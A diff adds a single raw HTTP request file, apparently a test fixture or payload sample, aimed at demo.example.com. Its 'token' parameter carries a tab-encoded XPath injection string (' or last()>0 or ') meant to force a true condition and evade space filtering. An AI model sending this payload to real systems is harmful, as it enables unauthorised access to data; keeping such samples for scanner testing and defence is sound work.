@@ -1,0 +1,4 @@
+GET /a?token='%09or%09last()>0%09or%09' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
